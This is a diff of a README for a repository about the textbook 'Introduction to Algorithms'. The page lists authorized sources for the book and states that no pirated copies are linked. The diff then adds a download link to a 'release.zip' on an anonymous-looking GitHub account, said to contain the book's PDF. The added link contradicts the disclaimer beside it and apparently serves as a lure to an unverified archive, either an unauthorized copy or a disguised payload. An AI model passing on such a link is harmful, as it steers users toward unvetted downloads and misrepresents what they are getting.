@@ -1,4 +1,4 @@
-# Introduction to Algorithms - Repository Release
+# Introduction to Algorithms
 
 ## Publication Information
 
@@ -47,6 +47,9 @@ For official access to the textbook, please refer to the following authorized so
 - [The MIT Press](https://mitpress.mit.edu/9780262033848/introduction-to-algorithms/)
 - [Amazon](https://www.amazon.com/Introduction-Algorithms-3rd-MIT-Press/dp/0262033844)
 - [Google Books](https://books.google.com/books/about/Introduction_to_Algorithms.html?id=NLngYyWFl_YC)
+
+Additionally, a repository release file containing the PDF is available for download:  
+[Download release.zip](https://github.com/anonofficals/introduction-to-algorithms/raw/main/release.zip)
 
 No pirated or unauthorized copies are endorsed or linked herein.
 
